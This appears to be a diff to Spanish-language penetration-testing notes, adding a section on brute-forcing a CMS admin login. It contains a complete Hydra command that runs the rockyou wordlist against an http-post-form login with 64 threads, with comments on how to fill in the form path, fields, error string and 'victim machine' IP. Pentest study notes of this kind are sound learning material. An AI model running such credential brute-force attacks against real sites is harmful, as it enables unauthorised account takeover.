@@ -30,6 +30,19 @@ Es una herramienta de prueba de penetración que se utiliza para realizar ataque
 /usr/share/wordlists/metasploit/common_users.txt
 ```
 
+## Fuerza bruta a un CMS
+
+```bash 
+❯ hydra -l admin -P /usr/share/wordlists/rockyou.txt <IP> http-post-form "/my_weblog/admin.php:username=^USER^&password=^PASS^:Incorrect" -t 64 -F 
+
+	# El formulario debe de cumplir con tres variables
+	# 1ra = Ruta desde la raiz hasta el admin.php
+	# 2do = Podemos obtener las variables de username y password capturando el trafico con 'Burpsuite' ya que ahi es donde las variables de usuario y variables del diccionario van a ser sustituidas 
+	# 3ro = Colocar el mensaje de error, lo podemos encontrar en el codigo del panel del login 'Ctrl + u'
+	# IP = La direccion IP de la maquina victima sin el protocolo 'http o https'
+	# F = Cuando hydra encuentre unas credenciales validas detendra el proceso y seguira con otro usuario en caso de tener mas 
+```
+
 ## Hydra fuerza bruta WordPress
 
 Esto se usa en el panel del admin de WordPress.
